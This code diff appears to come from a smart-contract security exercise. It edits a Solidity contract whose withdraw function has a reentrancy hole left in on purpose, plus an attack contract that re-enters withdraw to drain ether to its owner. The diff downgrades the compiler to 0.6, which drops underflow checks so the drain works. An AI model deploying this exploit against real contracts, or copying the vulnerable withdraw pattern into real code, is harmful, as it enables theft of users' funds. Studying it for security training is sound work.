@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.0;
 
 contract Reentrance {
     mapping(address => uint256) public balances;
@@ -14,7 +14,7 @@ contract Reentrance {
 
     function withdraw(uint256 _amount) public {
         if (balances[msg.sender] >= _amount) {
-            (bool result,) = msg.sender.call{value: _amount}("");
+            (bool result, ) = msg.sender.call{value: _amount}("");
             if (result) _amount;
             balances[msg.sender] -= _amount;
         }
@@ -27,7 +27,7 @@ contract ReentranceAttack {
     Reentrance public reentrance;
     address public owner;
 
-    constructor(address payable _reentranceAddress) {
+    constructor(address payable _reentranceAddress) public {
         reentrance = Reentrance(_reentranceAddress);
         owner = msg.sender;
     }
@@ -39,7 +39,8 @@ contract ReentranceAttack {
     }
 
     receive() external payable {
-        if (address(reentrance).balance >= 0.001 ether) reentrance.withdraw(0.001 ether);
+        if (address(reentrance).balance >= 0.001 ether)
+            reentrance.withdraw(0.001 ether);
         else payable(owner).transfer(address(this).balance);
     }
 }
